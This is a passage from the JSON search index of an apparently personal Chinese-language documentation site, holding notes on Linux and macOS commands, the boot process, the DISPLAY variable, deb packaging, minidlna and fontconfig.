[::1]","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tcping.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tcping.html"},{"title":"telnet","text":"登录远程主机和管理(也可以简单测试ip端口是否连通). 属于应用层的协议，可用于远程登录，也可用于检测IP的端口状态 注解 一般登陆成功就与目标主机端口建立链接了, 也可以用来作为一个简单的client测试server 语法: telnet [host|ip [port]]","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-telnet.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-telnet.html"},{"title":"map","text":"map(fun, iter) 第一个参数为函数， 第二个参数为迭代器，表示对每一个迭代器的元素做fun操作 当iter为list时， map(fun, iter) 等价于 [fun(x) for x in iter]","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-map.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-map.html"},{"title":"图标制作","text":"使用 /docs/操作系统/Mac/Mac指令/sips 例, 有一个1024*1024的png: pic.png: mkdir tmp.iconset # 命令格式：sips -z 新图片宽度 新图片高度 原图片名 --out 临时.iconset/新图片完整名 sips -z 16 16 pic.png --out tmp.iconset/icon_16x16.png sips -z 32 32 pic.png --out tmp.iconset/icon_16x16@2x.png sips -z 32 32 pic.png --out tmp.iconset/icon_32x32.png sips -z 64 64 pic.png --out tmp.iconset/icon_32x32@2x.png sips -z 128 128 pic.png --out tmp.iconset/icon_128x128.png sips -z 256 256 pic.png --out tmp.iconset/icon_128x128@2x.png sips -z 256 256 pic.png --out tmp.iconset/icon_256x256.png sips -z 512 512 pic.png --out tmp.iconset/icon_256x256@2x.png sips -z 512 512 pic.png --out tmp.iconset/icon_512x512.png sips -z 1024 1024 pic.png --out tmp.iconset/icon_512x512@2x.png 还可参考: https://blog.csdn.net/ypf1024/article/details/114011755","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-Icon-making.html","loc":"/yq-doc-source-docs-operating-system-Mac-Icon-making.html"},{"title":"sips","text":"sips, 图像处理脚本(scriptable image processing system), 支持进行图片的格式转换, 以及图片的裁剪旋转等各种常用操作. 是MacOS自带的图片处理命令, 功能强大. 质量高,pdf转png会丢失背景,且不能处理ico文件 注解 有个更简单的只能转换类型的 /docs/操作系统/Mac/Mac指令/convert , 不过清晰度不高. 图像处理脚本(scriptable image processing system): This tool is used to query or modify raster image files and ColorSync ICC profiles. Its functionality can also be used through the \"Image Events\" AppleScript suite. 命令格式简洁版(下面太长): sips -z 新图片宽度 新图片高度 原图片名 --out 临时.iconset/新图片完整名 Usages: sips [image-functions] imagefile ... sips [profile-functions] profile ... Profile query functions: -g, --getProperty key -X, --extractTag tag tagFile --verify -1, --oneLine Image query functions: -g, --getProperty key -x, --extractProfile profile -1, --oneLine Profile modification functions: -s, --setProperty key value -d, --deleteProperty key --deleteTag tag --copyTag srcTag dstTag --loadTag tag tagFile --repair -o, --out file-or-directory Image modification functions:: -s, --setProperty key value -d, --deleteProperty key -e, --embedProfile profile -E, --embedProfileIfNone profile -m, --matchTo profile -M, --matchToWithIntent profile intent --deleteColorManagementProperties -r, --rotate degreesCW -f, --flip horizontal|vertical -c, --cropToHeightWidth pixelsH pixelsW --cropOffset offsetY offsetH -p, --padToHeightWidth pixelsH pixelsW --padColor hexcolor -z, --resampleHeightWidth pixelsH pixelsW 裁剪图片, 指定宽度、高度 --resampleWidth pixelsW 裁剪图片, 指定宽度 --resampleHeight pixelsH 裁剪图片, 指定高度 -Z, --resampleHeightWidthMax pixelsWH 裁剪图片, 指定宽度(高度自适应) -i, --addIcon --optimizeColorForSharing -o, --out file-or-directory -j, --js file Other functions: --debug Enable debugging output -h, --help Show help -H, --helpProperties 所有键值参数(Show help for properties) --man Generate man pages -v, --version Show the version --formats 列出支持的格式(Show the read/write formats) 用例 图片格式转换 pdf->png: sips -s format png old.pdf -o new.png pdf->jpg: sips -s format jpeg old.pdf -o new.jpg jpg->gif: sips -s format gif old.jpg -o new.gif 注解 ico格式(图标)不能通过sips实现, 只能通过imagemagick来操作. 修改图片为指定像素 修改图片为20000像素宽, 高度为自适应(Z大写): sips -Z 20000 a.jpg 修改图片为200*200像素: sips -z 200 200 a.jpg 旋转/翻转图片 顺时针旋转图片180°: sips -r 180 a.jpg 水平/垂直翻转图片: sips -f horizontal a.jpg sips -f vertical a.jpg","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-SIPS.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-SIPS.html"},{"title":"elf文件","text":"参考: https://zhuanlan.zhihu.com/p/59590848 https://zhuanlan.zhihu.com/p/112754720 Linux 上可执行程序遵循的是 ELF（Executable and Linking Format）格式, 是一个定义了目标文件内部信息如何组成和组织的文件格式。 内核会根据这些信息加载可执行文件，内核根据这些信息可以知道从文件哪里获取代码， 从哪里获取初始化数据，在哪里应该加载共享库，等信息。 分类 .o目标文件 由: gcc -c test.c 得到的test.o就是目标文件，目标文件通过链接可生成可执行文件。 静态库其实也算目标文件，静态库是通过ar命令将目标打包为.a文件。 如: ar crv libtest.a test.o 可执行文件 可由: gcc -o test test.c 生成 .so共享库 可由生成: gcc test.c -fPIC -shared -o libtest.so 可以通过 /docs/操作系统/linux/linux指令/readelf 来区分上面三种类型的ELF文件","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-ELF-file.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-ELF-file.html"},{"title":"IO模型","text":"epoll 好处 epoll是单线程, 基于回调; 减少多线程切换的开销 epoll_create 函数: int epoll_create(int size); 关于更多信息, 可以通过查看: man epoll_create 注解 文件描述符（file descriptor）， Linux内核为高效管理已被打开的\"文件\"所创建的索引，用该索引可以找到文件 epoll_ctl 对于指定的文件描述符epfd引用的epoll实例, 监听相关事件event 函数: int epoll_ctl (int epfd, int op, int fd, struct epoll_event *event); op EPOLL_CTL_ADD： 注册新的fd到epfd中，并关联事件event； EPOLL_CTL_MOD：修改已经注册的fd的监听事件； EPOLL_CTL_DEL：从epfd中移除fd，并且忽略掉绑定的event，这时event可以为null; events 有很多可选值，这里只举例最常见的几个 EPOLLIN ：表示对应的文件描述符是可读的； EPOLLOUT：表示对应的文件描述符是可写的； EPOLLERR：表示对应的文件描述符发生了错误； 成功则返回0，失败返回-1 epoll_wait 等待 epoll_ctl 的事件 当socket收到数据后， 操作系統的中断程序调用回调函数会给epoll实例的 事件就緒列表rdlist里添加该socket引用（这块是操作系统实现的）， 当程序执行到epoll_wait 时，如果rdllist已经引用了socket， 那么 epoll_wait 直接返回，如果rdllist为空，阻塞进程 rdllist 就绪事件列表 再底层就是操作系统的 ** 中断** 实现","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-IO-model.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-IO-model.html"},{"title":"linux删除机制","text":"linux下文件是否真实存在可以通过硬连接判断 只要该文件硬连接数量大于等于1, 那么它就真实存在(数量就是有多少份而已) 而删除的时候, 需要保证两种链接的数量都为0, 才能真正删除: i_count, 被调用计数(可以理解为内存的引用计数器) i_nlink, 硬链接计数 使用rm删除一个文件时, 只是将i_nlink的数目减1, 但是若在此之前存在调用且未结束时, rm可以成功执行, 但是并不会真正从磁盘删除(因为i_count不为0) 如果要在这个时候找回被删除的文件, 停下其他的磁盘写入进程(防止对应的数据区块被覆盖), 然后找到当前这个被删除的文件就行 可以使用 lsof 或者直接去 /proc下找即可. 如: lsof | grep deleted 注解 检查link的办法: ls -ihl 检查i_count的办法(-u指在每个进程后显现所属的用户名，-v指详细形式): fuser -uv [绝对路径文件名]","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-deletion-mechanism.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-deletion-mechanism.html"},{"title":"sudo与su的部分说明","text":"su <user>: 切换到指定的user, 输出这个user的密码. 可以加 - 指定切换到user的环境. sudo <cmd>: 以root的身份执行指令, 还是使用当前用户的环境, 可以使用 -u 指定其他用户 sudo su: 切换到root, 保留最初的用户环境 sudo su -: 切换到root, 同时存在最初的用户的环境与root的用户环境, 如果冲突, 以root为准","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Part-of-the-SUDO-and-SU-explanation.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Part-of-the-SUDO-and-SU-explanation.html"},{"title":"指令export、env、set三者的区别","text":"export、env、set三者的区别 注解 echo $PATH #输出当前环境变量 locale #设置系统语言环境 set 用来显示本地变量 /docs/操作系统/linux/linux指令/set env 用来显示环境变量 /docs/操作系统/linux/linux指令/env export 用来显示和设置环境变量 /docs/操作系统/linux/linux指令/export shell变量 shell变量包括两种变量 本shell私有的变量：通过赋值语句定义好的变量，可以通过如下方法定义shell变量: A1=\"1234\" delcare A2=\"2345\" 用户的环境变量：通过export语法导出的shell私有变量，可以通过如下方法导出用户环境变量: A1=\"1234\" export A1 #先定义再导出 export A3=\"34\" 导出成的用户环境变量可以在所有的shell中看到 总结 set 显示当前shell的定义的私有变量，包括当前用户的环境变量，按变量名称排序； env 显示当前用户的变量 export 显示当前导出成用户变量的shell变量，并显示变量的属性(是否只读)，按变量名称排序； declare 同set 一样，显示当前shell的定义的变量，包括用户的环境变量。 每个shell有自己特有的变量（set）显示的变量，这个和用户变量是不同的， 当前用户变量和你用什么shell无关，不管你用什么shell都在， 比如HOME,SHELL等这些变量，但shell自己的变量不同shell是不同的，比 如BASH_ARGC， BASH等，这些变量只有set才会显示，是bash特有的， export不加参数的时候，显示哪些变量被导出成了用户变量， 因为一个shell自己的变量可以通过export \"导出\"变成一个用户变量。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-The-difference-between-instructions-Export,-ENV,-SET.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-The-difference-between-instructions-Export,-ENV,-SET.html"},{"title":"Linux系统的启动过程","text":"菜鸟的 Linux 系统启动过程 的解释还不错 涉及到指令: /docs/操作系统/linux/linux指令/init /docs/操作系统/linux/linux指令/shutdown /docs/操作系统/linux/linux指令/runlevel /docs/操作系统/linux/linux指令/halt /docs/操作系统/linux/linux指令/poweroff /docs/操作系统/linux/linux指令/reboot Linux系统的启动过程大致阶段: 内核的引导(/boot) 运行 init 系统初始化 建立终端 用户登录系统 init 常用机制: SysV: init, 如CentOS 5之前, 配置文件： /etc/inittab Upstart: init, 如CentOS 6, 配置文件： /etc/inittab, /etc/init/*.conf Systemd： systemd, 如CentOS 7,配置文件： /usr/lib/systemd/system、 /etc/systemd/system。 注解 配置文件可记录默认的 运行级别 内核引导 当计算机打开电源后，首先是BIOS开机自检，按照BIOS中设置的启动设备（通常是硬盘）来启动。 操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。 运行init init 进程是系统所有进程的起点，可以把它比拟成系统所有进程的老祖宗，没有这个进程，系统中任何进程都不会启动。 init 程序首先是需要读取配置文件 /etc/inittab(根据使用机制的不同读取不通的配置文件, 比如Ubuntu使用的是Upstart机制, 相关配置文件为/etc/init/rc-sysinit.conf) 运行级别 许多程序需要开机启动。它们在Windows叫做\"服务\"（service），在Linux就叫做\"守护进程\"（daemon）。 init进程的一大任务，就是去运行这些开机启动的程序。 但是，不同的场合需要启动不同的程序，比如用作服务器时，需要启动Apache，用作桌面就不需要。 Linux允许为不同的场合，分配不同的开机启动程序，这就叫做\"运行级别\"（runlevel）。也就是说，启动时根据\"运行级别\"，确定要运行哪些程序。 查看当前运行级别可使用 /docs/操作系统/linux/linux指令/runlevel Linux系统有7个运行级别(runlevel), 也就是init指令支持的参数： 运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动 运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登录 运行级别2：多用户状态(没有NFS) 运行级别3：完全的多用户状态(有NFS)，登录后进入控制台命令行模式 运行级别4：系统未使用，保留 运行级别5：X11控制台，登录后进入图形GUI模式 运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动 系统初始化 在init的配置文件中有这么一行: si::sysinit:/etc/rc.d/rc.sysinit 它调用执行了/etc/rc.d/rc.sysinit，而rc.sysinit是一个bash shell的脚本， 它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。 它主要完成的工作有: 激活交换分区 检查磁盘 加载硬件模块 一些需要优先执行任务。 如下面的内容: l5:5:wait:/etc/rc.d/rc 5 表示以5为参数运行/etc/rc.d/rc，/etc/rc.d/rc是一个Shell脚本，它接受5作为参数， 去执行/etc/rc.d/rc5.d/目录下的所有的rc启动脚本，/etc/rc.d/rc5.d/目录中的这些启动脚本实际上都是一些连接文件， 而不是真正的rc启动脚本，真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。 而这些rc启动脚本有着类似的用法，它们一般能接受start、stop、restart、status等参数。 /etc/rc.d/rc5.d/中的rc启动脚本通常是K或S开头的连接文件，对于以 S 开头的启动脚本，将以start参数来运行。 而如果发现存在相应的脚本也存在K打头的连接，而且已经处于运行态了(以/var/lock/subsys/下的文件作为标志)， 则将首先以stop为参数停止这些已经启动了的守护进程，然后再重新运行。 这样做是为了保证是当init改变运行级别时，所有相关的守护进程都将重启。 至于在每个运行级中将运行哪些守护进程，用户可以通过chkconfig或setup中的\"System Services\"来自行设定。 建立终端 rc执行完毕后，返回init。这时基本系统环境已经设置好了，各种守护进程也已经启动了。 init接下来会打开6个终端，以便用户登录系统。在inittab中的以下6行就是定义了6个终端: 1:2345:respawn:/sbin/mingetty tty1 2:2345:respawn:/sbin/mingetty tty2 3:2345:respawn:/sbin/mingetty tty3 4:2345:respawn:/sbin/mingetty tty4 5:2345:respawn:/sbin/mingetty tty5 6:2345:respawn:/sbin/mingetty tty6 从上面可以看出在2、3、4、5的运行级别中都将以respawn方式运行mingetty程序，mingetty程序能打开终端、设置模式。 同时它会显示一个文本登录界面，这个界面就是我们经常看到的登录界面，在这个登录界面中会提示用户输入用户名， 而用户输入的用户将作为参数传给login程序来验证用户的身份。 用户登录系统 一般来说，用户的登录方式有三种： 命令行登录 ssh登录 图形界面登录 对于运行级别为5的图形方式用户来说，他们的登录是通过一个图形化的登录界面。登录成功后可以直接进入 KDE、Gnome 等窗口管理器。 而本文主要讲的还是文本方式登录的情况：当我们看到mingetty的登录界面时，我们就可以输入用户名和密码来登录系统了。 Linux 的账号验证程序是 login，login 会接收 mingetty 传来的用户名作为用户名参数。 然后 login 会对用户名进行分析：如果用户名不是 root，且存在 /etc/nologin 文件，login 将输出 nologin 文件的内容，然后退出。 这通常用来系统维护时防止非root用户登录。只有/etc/securetty中登记了的终端才允许 root 用户登录，如果不存在这个文件， 则 root 用户可以在任何终端上登录。 /etc/usertty文件用于对用户作出附加访问限制，如果不存在这个文件，则没有其他限制。 图形模式与文字模式的切换方式 Linux预设提供了六个命令窗口终端机让我们来登录。 默认我们登录的就是第一个窗口，也就是tty1，这个六个窗口分别为tty1,tty2 … tty6，即 建立终端 部分介绍的六个终端 你可以按下Ctrl + Alt + F1 ~ F6 来切换它们。 如果你安装了图形界面，默认情况下是进入图形界面的，此时你就可以按Ctrl + Alt + F1 ~ F6来进入其中一个命令窗口界面。 当你进入命令窗口界面后再返回图形界面只要按下Ctrl + Alt + F7 就回来了。 如果你用的 vmware 虚拟机 ，命令窗口切换的快捷键为 Alt + Space + F1~F6. 如果你在图形界面下请按Alt + Shift + Ctrl + F1~F6 切换至命令窗口。 Linux启动加载顺序图例 Linux 关机 在linux领域内大多用在服务器上，很少遇到关机的操作。毕竟服务器上跑一个服务是永无止境的，除非特殊情况下，不得已才会关机。 正确的关机流程为: sync > shutdown > reboot > halt 关机可使用的指令: init 0 shutdown –h now halt poweroff 重启可使用的指令: shutdown –r now reboot init 6 关机指令为：shutdown ，你可以man shutdown 来看一下帮助文档。 例如你可以运行如下命令关机, 先存数据: sync 将数据由内存同步到硬盘中 执行shutdown 关机指令，例如你可以运行如下命令关机: shutdown –h 10 ‘This server will shutdown after 10 mins' 计算机将在10分钟后关机，并且会显示在登陆用户的当前屏幕中。 shutdown –h now 立马关机 shutdown –h 20:25 系统会在今天20:25关机 shutdown –h +10 十分钟后关机 shutdown –r now 系统立马重启 shutdown –r +10 系统十分钟后重启 或者reboot 就是重启，等同于 shutdown –r now: reboot 或者 halt 关闭系统，等同于shutdown –h now 和 poweroff: halt","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-The-startup-process-of-the-Linux-system.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-The-startup-process-of-the-Linux-system.html"},{"title":"终端 tty console区别","text":"冲浪看到的: https://www.zhihu.com/question/21711307/answer/2231006377 若无了可见pdf: ../../../../resources/pdf/终端、Shell、tty 和控制台（console）有什么区别？ - 知乎.pdf","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Ty-Console-difference-between-terminals.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Ty-Console-difference-between-terminals.html"},{"title":"Linux下DISPLAY作用","text":"DISPLAY用来设置将图形显示到何处, 或者说设置或显示当前的显示环境 (指定X服务器的现实设备) 格式: hostname:display.number.screen.number hostname表示运行X服务器的主机名或IP地址 display.number表示X服务器的编号 screen.number表示屏幕的编号 默认值: 当你在终端中启动X服务器时，系统会自动设置DISPLAY环境变量的值。 通常情况下，默认值为:0.0，表示使用本地主机上的第一个X服务器和第一个屏幕。 显示当前的显示环境: echo $DISPLAY 一些常见使用 设置显示环境 设置显示环境为本地显示器: export DISPLAY=:0 设置显示环境为第二个本地显示器: export DISPLAY=:1 设置显示环境为ip地址的第一显示器: export DISPLAY=ip:0 控制X11程序在哪个显示器上启动 当设置了display变量后,启动的X11程序默认会在该显示环境打开。 例如, 在第二个显示器上启动xterm: export DISPLAY=:1 xterm 运行远程程序 在本地显示远程linux服务器上的图形界面程序: ssh -X remote_server export DISPLAY=localhost:0.0 # 设置远程显示环境为本地显示器 xterm # 远程服务器上的xterm将显示在本地显示器上 特殊情况, 提权后的变化 主要针对使用 sudo, su, pkexec 这类指令. 设定当前登录普通用户为 bob 测试机器, ubuntu20 场景1: 使用 sudo su 切换root 效果是切到到了root, 仅保留了最初用户(切换时使用的用户bob)的环境变量. 这个时候, DISPLAY的值没有变化 场景2: 使用 sudo su - 切换root 效果是切到到了root, 同时加载root环境变量. 这个时候, DISPLAY的值是空字符串(root环境变量没有指定时) 场景3: 使用 pkexec <cmd> 切换root 效果是只能以root身份执行当次cmd, 会保留用户bob的 DISPLAY 值, 但是, 使用的这个DISPLAY界面是受限制的, pkexec启动的图形程序会在一个纯净和受限的X session下运行 实际场景: pkexec + sudo 实际的应用场景就是 pkexec 的 cmd 做了一些操作后, 启动图形界面 时(比如存在SDL依赖), 需要以bob的身份启动: pkexec bash -c \"xxx; sudo -u bob start_app\" 这个时候就报错: failed to initialize SDL: No available video device 虽然pkexec会保留, 但是效果貌似还是行, 需要在pkexec之前手动重置: pkexec bash -c \"export DISPLAY=$DISPLAY; sudo -u bob start_app\" # pkexec bash -c \"env DISPLAY=$DISPLAY sudo -u bob start_app\" 脚本中使用 export DISPLAY 或 env DISPLAY , 一直会出现export这一步卡住的问题, 暂时没有找到原因. 不排除是 pkexec 使用了一些安全机制来隔离和限制启动进程的权限, 如对环境变量的修改, 导致 export 这一步会永远等待 ,看起来就像卡住了一样. 但是直接在命令行执行又不会卡, 就很懵. 且不export或者不env时候, 打印出的 DISPLAY 值是正确的, 必须得显示设置一下, 才能正常启动(我这里是启动的SDL). 而同事的 ubuntu18 又没有这个问题... 又尝试了一下, 发现直接: pkexec bash xxx.sh 而 xxx.sh 内部是读不到 DISPLAY 的值的. 卡的原因也找到了, 脚本加了: set -eu 因为没有定义 DISPLAY , 所以使用的时候直接退出了(-u) 注解 这里没搞懂是根据什么来判断受限的, 试过不重置, 子进程也能正常获取到DISPLAY. 为什么export能清除掉受限状态.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-Disch.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-Disch.html"},{"title":"本地构建deb包","text":"debian官方文档: https://www.debian.org/releases/stable/amd64/index.zh-cn.html control文件说明: https://www.debian.org/doc/debian-policy/ch-controlfields.html 文件结构 DEBIAN 下的这些文件, 安装后一般都可以在 /var/lib/info 下找到, 如 /var/lib/info/xxx.prerm* 大概包目录结构如下: |----DEBIAN |-------control |-------postinst(postinstallation) |-------postrm(postremove) |-------preinst(preinstallation) |-------prerm(preremove) |-------copyright(版权) |-------changlog(修订记录) |-------conffiles |----etc |----usr |----opt |----tmp |----boot |-----initrd-vstools.img DEBIAN 下的文件大多都需要可执行权限 control文件 官方字段说明见: https://www.debian.org/doc/debian-policy/ch-controlfields.html deb包必须具备的描述性文件，以便于软件的安装管理和索引 内容字段说明 Package 程序名称 中间不能有空格 Version 版本 Section 软件类别 utils, net, mail, text, x11 Priority 软件对于系统的重要程度 required, standard, optional, extra等 Essential 是否是系统最基本的软件包 yes/no，若为yes,则不允许卸载（除非强制性卸载） Architecture 软件所支持的平台架构 all, i386, amd64, m68k, sparc, alpha, powerpc等, 支持的架构可参考: https://www.debian.org/releases/stable/amd64/ch02s01.zh-cn.html Source 软件包的源代码名称 Depends 软件所依赖的其他软件包和库文件 若依赖多个软件包和库文件，采用逗号隔开 Pre-Depends 软件安装前必须安装、配置依赖性的软件包和库文件 常用于必须的预运行脚本需求 Recommends 推荐安装的其他软件包和库文件 Suggests 建议安装的其他软件包和库文件 Maintainer 维护者 Description 程序说明 Homepage 主页 Installed-Size: 安装大概消耗的空间(预估值, 实际可能有所不同), 只写数字即可, 单位字节 Download-Size: 大小需要下载的包的大小, 只写数字大小即可, 单位字节 MimeType: 关联的文件类型, 比如vscode设置了 inode/directory 就可以右键选择其他应用打开的时候有vscode MimeType支持的部分类型: inode/directory：普通文件夹 text/plain: 文本文件 application/x-gnome-saved-search：GNOME 桌面环境中保存的搜索结果文件夹 inode/mount-point：挂载点，表示一个已挂载的设备或文件系统 inode/blockdevice：块设备文件夹 inode/chardevice：字符设备文件夹 inode/socket：套接字文件夹 inode/fifo：命名管道文件夹 application/Xcode-workspace: xcode项目, 主要是苹果下面的 postinst文件 在Deb包文件解包之前（即软件安装前），将会运行该脚本。可以停止作用于待升级软件包的服务，直到软件包安装或升级完成。 preinst文件 负责完成安装包时的配置工作。如新安装或升级的软件重启服务。软件安装完后，执行该Shell脚本，一般用来配置软件执行环境，必须以\"#!/bin/sh\"为首行。 prerm文件 该脚本负责停止与软件包相关联的daemon服务。它在删除软件包关联文件之前执行 postrm文件 负责修改软件包链接或文件关联，或删除由它创建的文件。软件卸载后，执行该Shell脚本，一般作为清理收尾工作，必须以\"#!/bin/sh\"为首行 copyright文件 changlog文件 conffiles文件 用例 大概目录结构: .dist/deb_ev-deb/ |-- DEBIAN | `-- control | `-- postinit `-- usr |-- local | `-- life | `-- ev-deb-1.0.1 | `-- main.bin `-- share |-- applications | `-- life | `-- ev-deb.desktop `-- icons `-- life `-- ic.png 其中: DEBIAN/control 是包相关信息, 必有. 配置内容大概: Package: ev-deb Version: 1.0.1 Architecture: amd64 Maintainer: yq Description: desc a every deb DEBIAN/control 这里用来做桌面图标设置相关脚本, 有GUI界面才需要设置 内容: #!/bin/bash cp /usr/share/applications/life/ev-deb.desktop ~/Desktop 其他的比如 usr 是模仿linux系统结构来进行布局, 比如这里的是 usr/local/life/ev-deb-1.0.1 , 那么实际的安装位置就是 /usr/local/life/ev-deb-1.0.1 . usr/share/applications/life/ev-deb.desktop , 主要是需要在 /usr/share/applications 创建一个 .desktop 文件, 以便于在 GUI 界面的时候可以在桌面活着任务栏看到, 若是GUI应用必有. 配置内容大概: [Desktop Entry] Name=ev-deb Comment=desc a every deb Exec=.dist/deb_ev-deb/ev-deb-1.0.1/main.bin Icon=.dist/deb_ev-deb/usr/share/icons/life/ic.png Terminal=true Type=Application X-Ubuntu-Touch=true Categories=Development 且必有可执行权限. Name 表示在桌面上显示的名称 usr/share/icons , 图标位置, GUI界面必有, 用于 .desktop 文件. 特别说明, Exec字段指定的路径如果有空格, 可以用引号代替 Icon字段指定的图标路径不能有引号与空格, 否则 dpkg -b 打包的时候校验不通过(但是实际安装好后可以用空格, 不能用引号). 注解 usr/share/applications/ 下是系统的启动器默认的应用(桌面文件)存放位置, 若放在其他位置如 ~/.local/share/applications/ , 可使用指令更新: update-desktop-database ~/.local/share/applications/ 这样就不需要手动 右键 - 允许启动 了 官方文档建议的打包工具 debmake: deb目录结构生成工具 (好像需要手动装) debbuild: 根据上一步构建好的结构, 生成包, 与 dpkg -b 类似, 不过 dpkg 更底层. debbuild 读取软件包的源代码目录中的 debian/rules` 文件来执行构建过程， 并自动处理构建过程中的许多步骤，例如配置、编译和安装. debuild 还会检查构建依赖关系并确保它们已满足，以及生成符合 Debian 软件包规范的二进制和源代码软件包. dpkg -b 是一个更底层的工具，用于将已经构建好的二进制文件打包成一个 Debian 格式的软件包. 它不会自动执行构建过程，而是需要手动提供已经构建好的文件和必要的控制信息（例如包名、版本号、依赖关系等）. dpkg -b 的优点是灵活性，允许用户手动控制软件包的构建流程和细节. deb包配置右键单击支持使用其他应用打开 只需配置 desktop 文件, 如上面的 usr/share/applications/life/ev-deb.desktop 还是用上面的例子: [Desktop Entry] Name=ev-deb Comment=desc a every deb Exec=.dist/deb_ev-deb/ev-deb-1.0.1/main.bin Icon=.dist/deb_ev-deb/usr/share/icons/life/ic.png Terminal=true Type=Application X-Ubuntu-Touch=true Categories=Development 有两个地方要改, 一个是Exec改为需要增加参数 Exec=.dist/deb_ev-deb/ev-deb-1.0.1/main.bin %F 部分支持的参数: %F: 选中文件夹或文件的路径 %U: 选中文件夹的路径 另一个是增加 `MimeType` , 与 control文件 的 MimeType 一致, 需要说明的是, 即使已经在 control文件 写了 MimeType , 还是得在 desktop 文件再写一次(多个用分号隔开), 两个地方的不共享. 表示哪些类型的文件可以右键选择用此应用打开. 比如: MimeType=text/plain;inode/directory;application/x-code-workspace;","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Build-a-local-bucket.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Build-a-local-bucket.html"},{"title":"Linux下配置DLAN服务","text":"DLAN是一个适用于多媒体的传输协议 安装 minidlna: sudo apt-get install -y minidlna 编辑 minidlna 的配置文件 /etc/minidlna.conf media_dir=/path/to/media db_dir=/var/lib/minidlna log_dir=/var/log/minidlna friendly_name=DLNA Server port=8200 其中 media_dir 是您媒体文件所在的目录，可以指定多个目录； friendly_name 是服务器名称； port 是服务监听的端口号。 启动 minidlna 服务: sudo service minidlna start 添加共享文件夹: sudo minidlna -R 此命令将重新扫描 media_dir 中的媒体文件，并添加到 DLNA 服务器中。 测试 DLNA 服务器是否正常工作： 使用支持 DLNA 协议的设备或软件， 例如 VLC 播放器、Windows Media Player 等，连接到 DLNA 服务器的 IP 地址和端口号即可访问。 如果一切正常，则应该可以浏览、搜索和播放媒体文件了。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Configure-the-DLAN-service-under-Linux.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Configure-the-DLAN-service-under-Linux.html"},{"title":"debian/ubuntu字体说明","text":"Ubuntu字体及配置说明: https://wiki.ubuntu.org.cn/字体#.E9.85.8D.E7.BD.AE.fonts.conf 参考: https://catcat.cc/post/2020-10-31/ Linux 桌面程序使用字体的方式，受 fontconfig 的影响和控制。 一个字体文件，可以提供多个字体族名 (family)。 比如 Arch Linux 用户在 安装 wqy-microhei 后， 系统端增加了 wqy-microhei.ttc 这个 字体文件， 分别提供「WenQuanYi Micro Hei」「文泉驛微米黑」,「文泉驿微米黑」 三个字体族名， 它们是一个意思。可以运行 fontconfig 提供的命令行工具 fc-list 去查看系统上 已安装的字体已经它们对应的字体族名。 至于 sans-serif，serif，monospace，则是三个通用字体族名 (generic family)， 它们不是真实存在的字体，而是分别指示程序去使用无衬线、衬线、等宽字体。 那么桌面程序又是如何知道具体使用哪些字体呢？ 它只需要去查询 fontconfig 就行了。 由于它们必定要经过 fontconfig 的查询流程后才能使用字体， 所以我们可以通过 fontconfig 的配置去精准控制程序使用的字体。 配置文件流向 fontconfig 主要读取 /etc/fonts/fonts.conf /etc/fonts/conf.d/*.conf ~/.config/fontconfig/fonts.conf ~/config/fontconfig/conf.d/*.conf 至于那些历史遗留的目录位置 ~/.fonts.conf.d/*.conf 和 ~/.fonts.conf ， 由于不遵守 XDG 规范，我们就不要再使用它们了。 fontconfig 并非固定读取这些位置，它首先读取 /etc/fonts/fonts.conf，该文件中有句: <include ignore_missing=\"yes\">conf.d</include> 表示将 /etc/fonts/conf.d/ 目录中的文件纳入读取中, 在这个目录中的配置文件，按照文件名前的数字的顺序进行读取。 而当读取到50-user.conf的时候，其中的语句: <include ignore_missing=\"yes\" prefix=\"xdg\">fontconfig/conf.d</include> <include ignore_missing=\"yes\" prefix=\"xdg\">fontconfig/fonts.conf</include> <include ignore_missing=\"yes\" deprecated=\"yes\">~/.fonts.conf.d</include> <include ignore_missing=\"yes\" deprecated=\"yes\">~/.fonts.conf</include> 指示 fontconfig 开始读取用户家目录下的配置文件。 语句中的属性值prefix=\"xdg\"，代表 XDG_CONFIG_HOME 目录， 默认是我们熟悉的~/.config/目录。 字体文件位置 fontconfig 的很多配置文件是先从/etc/fonts/fonts.conf引入的。 其实，fontconfig 获取字体文件的位置，也是该文件定义的。 你会发现 该文件的开头就在指定字体目录: <dir>/usr/share/fonts</dir> <dir>/usr/local/share/fonts</dir> <dir prefix=\"xdg\">fonts</dir> <!-- the following element will be removed in the future --> 